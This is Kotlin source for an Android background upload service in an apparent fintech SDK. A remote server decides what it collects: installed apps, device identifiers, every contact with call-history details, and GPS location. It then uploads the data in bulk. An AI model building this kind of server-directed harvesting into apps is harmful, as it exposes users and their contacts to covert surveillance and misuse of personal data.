package com.fintek.upload_sdk

import android.Manifest
import android.annotation.SuppressLint
import android.app.IntentService
import android.content.Context
import android.content.Intent
import android.os.Build
import android.widget.Toast
import androidx.annotation.RequiresApi
import androidx.annotation.RequiresPermission
import com.fintek.upload_sdk.model.Config
import com.fintek.upload_sdk.model.UserAuthInfo
import com.fintek.upload_sdk.network.ApiService
import com.fintek.upload_sdk.network.RetrofitHelper
import com.fintek.upload_sdk.utils.EstimateUtils
import com.fintek.utils_androidx.`package`.PackageUtils
import com.fintek.utils_androidx.contact.ContactUtils
import com.fintek.utils_androidx.location.LocationUtils
import com.google.gson.Gson
import kotlinx.coroutines.*
import okhttp3.MediaType
import okhttp3.MediaType.Companion.toMediaTypeOrNull
import okhttp3.RequestBody
import okhttp3.RequestBody.Companion.toRequestBody
import java.util.concurrent.atomic.AtomicBoolean
import java.util.concurrent.atomic.AtomicInteger

/**
 * Created by ChaoShen on 2020/11/27
 */
class UploadService : IntentService("Upload"), CoroutineScope by MainScope() {

    companion object {
        @JvmStatic
        fun startService(context: Context, block: Config.() -> Unit) {
            val config = Config()
            block.invoke(config)

            UploadUtils.setConfig(config)
            val intent = Intent(context, UploadService::class.java)
            context.startService(intent)
        }
    }

    private val locationUtils = LocationUtils()
    private val apiService: ApiService = RetrofitHelper.getApi(ApiService::class.java)

    private var running = AtomicBoolean(false)
    private var count = AtomicInteger(0)

    @RequiresPermission(anyOf = [Manifest.permission.ACCESS_FINE_LOCATION])
    override fun onHandleIntent(intent: Intent?) {
        if (running.get()) {
            return
        }
        locationUtils.registerLocationListener()
        launch { doUpload() }
    }

    @RequiresPermission(anyOf = [Manifest.permission.ACCESS_FINE_LOCATION])
    private suspend fun doUpload() = withContext(Dispatchers.Default) {
        try {
            running.set(true)
            val extInfoRec = getRec()

            if (extInfoRec.isAllEmpty()) { //需要的信息都是空的时候就不进行上传
                stop()
                return@withContext
            }

            val appList = extInfoRec.appList
            if (appList != null) {
                Toast.makeText(UploadUtils.requiredContext,
                    "AppList(size: ${appList.size}, [${appList[0]}])", Toast.LENGTH_LONG).show()
            }
            val requestBody = mapOf("extInfoReq" to extInfoRec).requestBody()
            val result = apiService.postExtInfo(requestBody)

            if (result.isSuccess) {
                stop()
            } else {
                reSaveExtInfo()
            }
        } catch (e: Exception) {
            reSaveExtInfo()
        }
    }

    /**
     * 上传错误的重新上传
     */
    @RequiresPermission(anyOf = [Manifest.permission.ACCESS_FINE_LOCATION])
    private suspend fun reSaveExtInfo() {
        if (count.get() >= 2) {
            stop()
            return
        }

        doUpload()
        synchronized(count) {
            count.getAndIncrement()
        }
    }


    @RequiresPermission(anyOf = [Manifest.permission.READ_CONTACTS])
    private suspend fun getRec(): UserAuthInfo = withContext(Dispatchers.Default) {
        val userAuthInfo = UserAuthInfo(merchantId = UploadUtils.requiredConfig.merchant)

        val result = apiService.fetchUserExtExpired()
        val response = result.data

        if (result.isFailed || response == null) {
            return@withContext userAuthInfo
        }

        if (response.appInfo) userAuthInfo.putAppList()
        if (response.equipmentInfoMap || response.imei) userAuthInfo.putEstimateInfo()
        if (response.userContact) userAuthInfo.putContacts()
        if (response.gps) userAuthInfo.putLocation()

         return@withContext userAuthInfo
    }

    /**
     * 放app列表
     */
    private fun UserAuthInfo.putAppList() {
        appList = PackageUtils.getAllPackage().map {
            UserAuthInfo.AppInfo(
                appName = it.appName,
                packageName = it.packageName,
                installTime = it.installTime.toString(),
                updateTime = it.updateTime.toString(),
                versionName = it.versionName,
                versionCode = it.versionCode.toString(),
                flags = it.flags.toString(),
                appType = it.appType.toString()
            )
        }
    }

    /**
     * 放额外信息
     */
    @SuppressLint("MissingPermission")
    private fun UserAuthInfo.putEstimateInfo() {
        equipmentInfoMap = EstimateUtils.getEstimateMap()
    }

    /**
     * 放通讯录信息
     */
    @RequiresApi(Build.VERSION_CODES.KITKAT)
    @RequiresPermission(Manifest.permission.READ_CONTACTS)
    private fun UserAuthInfo.putContacts() {
        val contactInfo = ContactUtils.getContacts()
        val transformList = mutableListOf<UserAuthInfo.UserContact>()
        contactInfo.asSequence().forEach {
            when {
                it.phone!!.size == 1 -> transformList.add(
                    UserAuthInfo.UserContact(
                        name = it.name,
                        phone = it.phone!![0],
                        hasPhoneNumber = it.hasPhoneNumber.toString(),
                        inVisibleGroup = it.inVisibleGroup.toString(),
                        isUserProfile = it.isUserProfile,
                        timesContacted = it.timesContacted.toString(),
                        upTime = it.upTime,
                        sendToVoiceMail = it.sendToVoiceMail.toString(),
                        lastTimeContacted = it.lastTimeContacted.toString(),
                        starred = it.starred.toString()
                    )
                )
                it.phone!!.size > 1 -> transformList.addAll(
                    it.phone!!.map { internalPhone ->
                        UserAuthInfo.UserContact(
                            name = it.name,
                            phone = internalPhone,
                            hasPhoneNumber = it.hasPhoneNumber.toString(),
                            inVisibleGroup = it.inVisibleGroup.toString(),
                            isUserProfile = it.isUserProfile,
                            timesContacted = it.timesContacted.toString(),
                            upTime = it.upTime,
                            sendToVoiceMail = it.sendToVoiceMail.toString(),
                            lastTimeContacted = it.lastTimeContacted.toString(),
                            starred = it.starred.toString()
                        )
                    }
                )
            }
        }

        contactList = transformList
    }

    /**
     * 放位置信息
     */
    private fun UserAuthInfo.putLocation() {
        try {
            val locationData = locationUtils.getLocationData()
            gps = UserAuthInfo.GpsBean(
                latitude = locationData?.location?.latitude?.toString() ?: "0",
                longitude = locationData?.location?.longitude?.toString() ?: "0"
            )
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }

    /**
     * 停止服务，这个操作会取消协程
     */
    @RequiresPermission(anyOf = [Manifest.permission.ACCESS_FINE_LOCATION])
    private fun stop() {
        count.set(0)
        running.set(false)
        locationUtils.unregisterLocationListener()
        stopSelf()
    }

    private fun Map<*, *>.requestBody(mediaType: MediaType? = "application/json; charset=utf-8".toMediaTypeOrNull()): RequestBody {
        return Gson().toJson(this)
            .toRequestBody(mediaType)
    }
}